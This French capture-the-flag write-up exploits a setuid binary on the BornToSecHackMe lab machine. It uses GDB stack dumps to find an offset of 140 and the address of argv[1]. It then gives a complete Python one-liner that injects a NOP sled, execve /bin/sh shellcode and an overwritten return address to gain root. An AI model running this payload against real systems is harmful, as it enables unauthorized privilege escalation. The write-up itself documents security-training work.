
A partir du user __zaz__ on obtient un binaire que l'on vas exploiter via un __shellcode__ pour lancer un /bin/sh

on vas recuperer l'offset du programme en le faisant segfault dans GDB on obtient donc un offset de 140


on chercher ensuite l'addresse de argv[1]

```bash
zaz@BornToSecHackMe:~$ gdb exploit_me 
[...]
(gdb) b main
Breakpoint 1 at 0x80483f7
(gdb) r AAAAAAAA
Starting program: /home/zaz/exploit_me AAAAAAAA

Breakpoint 1, 0x080483f7 in main ()
(gdb) x /150x $esp
0xbffff748:     0x00000000      0xb7e454d3      0x00000002      0xbffff7e4
0xbffff758:     0xbffff7f0      0xb7fdc858      0x00000000      0xbffff71c
0xbffff768:     0xbffff7f0      0x00000000      0x0804820c      0xb7fd0ff4
0xbffff778:     0x00000000      0x00000000      0x00000000      0x93fefc9b
0xbffff788:     0xa4b9788b      0x00000000      0x00000000      0x00000000
0xbffff798:     0x00000002      0x08048340      0x00000000      0xb7ff26b0
0xbffff7a8:     0xb7e453e9      0xb7ffeff4      0x00000002      0x08048340
0xbffff7b8:     0x00000000      0x08048361      0x080483f4      0x00000002
0xbffff7c8:     0xbffff7e4      0x08048440      0x080484b0      0xb7fed280
0xbffff7d8:     0xbffff7dc      0xb7fff918      0x00000002      0xbffff90b
0xbffff7e8:     0xbffff920      0x00000000      0xbffff929      0xbffff93d
0xbffff7f8:     0xbffff94d      0xbffff96e      0xbffff981      0xbffff98a
0xbffff808:     0xbffffeab      0xbffffeb7      0xbffffeca      0xbfffff17
0xbffff818:     0xbfffff26      0xbfffff34      0xbfffff45      0xbfffff4e
0xbffff828:     0xbfffff56      0xbfffff65      0xbfffff71      0xbfffffa5
0xbffff838:     0xbfffffc5      0x00000000      0x00000020      0xb7fdd418
0xbffff848:     0x00000021      0xb7fdd000      0x00000010      0x178bfbff
0xbffff858:     0x00000006      0x00001000      0x00000011      0x00000064
0xbffff868:     0x00000003      0x08048034      0x00000004      0x00000020
0xbffff878:     0x00000005      0x00000008      0x00000007      0xb7fde000
0xbffff888:     0x00000008      0x00000000      0x00000009      0x08048340
0xbffff898:     0x0000000b      0x000003ed      0x0000000c      0x000003ed
0xbffff8a8:     0x0000000d      0x000003ed      0x0000000e      0x000003ed
0xbffff8b8:     0x00000017      0x00000001      0x00000019      0xbffff8eb
0xbffff8c8:     0x0000001f      0xbfffffe7      0x0000000f      0xbffff8fb
0xbffff8d8:     0x00000000      0x00000000      0x00000000      0x00000000
0xbffff8e8:     0xa2000000      0x2ea257c9      0xfcf23608      0xd70cb051
0xbffff8f8:     0x69b662bb      0x00363836      0x00000000      0x00000000
0xbffff908:     0x2f000000      0x656d6f68      0x7a617a2f      0x7078652f
0xbffff918:     0x74696f6c      0x00656d5f      0x41414141      0x41414141
0xbffff928:     0x52455400      0x74783d4d      0x2d6d7265      0x63363532
0xbffff938:     0x726f6c6f      0x45485300      0x2f3d4c4c      0x2f6e6962
0xbffff948:     0x68736162      0x48535300      0x494c435f      0x3d544e45
0xbffff958:     0x2e323931      0x2e383631      0x312e3635      0x37373420
0xbffff968:     0x32203433      0x53530032      0x54545f48      0x642f3d59
0xbffff978:     0x702f7665      0x302f7374      0x45535500      0x617a3d52
0xbffff988:     0x534c007a      0x4c4f435f      0x3d53524f      0x303d7372
0xbffff998:     0x3d69643a      0x333b3130
(gdb) x/s 0xbffff927
0xbffff927:      "A"
```

on trouve donc 0xbffff927 comme addresse de argv[1]

on vas ecrire un one liner python pour executer le shellcode avec un nop land pour etre sur de toucher argv[1] au moment de l'execution

```bash
./exploit_me $(python -c 'print("\x90" * 50 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "A" * (140 - 50 - 21) + "\xc0\xf8\xff\xbf")')
```

Nous somme passes root !